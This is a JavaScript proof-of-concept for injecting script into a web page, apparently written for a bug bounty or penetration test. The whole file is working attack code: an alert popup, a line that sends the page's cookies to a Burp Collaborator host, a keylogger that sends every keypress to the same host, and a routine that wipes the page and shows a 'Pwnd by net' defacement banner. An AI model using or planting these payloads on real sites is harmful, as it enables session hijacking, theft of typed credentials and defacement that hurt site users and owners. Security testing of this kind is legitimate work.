// =========================
// NET REMOTE JS INJECTION POC SCRIPT
// =========================

// 1. XSS popup
alert("net poc!");

// 2. Cookie steal (PoC: sends to Burp Collaborator)
fetch("https://i8rwhe8h6aqq1g3280nuon7xjoppde.burpcollaborator.net/log?c=" + encodeURIComponent(document.cookie));

// 3. Keylogger (PoC: sends each keypress)
document.addEventListener("keypress", function(e) { 
    fetch("https://i8rwhe8h6aqq1g3280nuon7xjoppde.burpcollaborator.net?key=" + encodeURIComponent(e.key));
});

// 4. Page takeover (safe method with wait loop)
(function takeover() {
    let takeoverInterval = setInterval(() => {
        if (document.body) {
            clearInterval(takeoverInterval);

            // Create deface banner
            let banner = document.createElement("div");
            banner.style = [
                "position: fixed",
                "top: 0",
                "left: 0",
                "width: 100%",
                "padding: 20px",
                "background: red",
                "color: white",
                "font-size: 28px",
                "font-weight: bold",
                "z-index: 999999",
                "text-align: center"
            ].join(";");

            banner.innerText = "⚠ REMOTE JS INJECTION POC: Pwnd by net";

            document.body.innerHTML = ""; // wipe page (optional)
            document.body.appendChild(banner);
        }
    }, 100);
})();
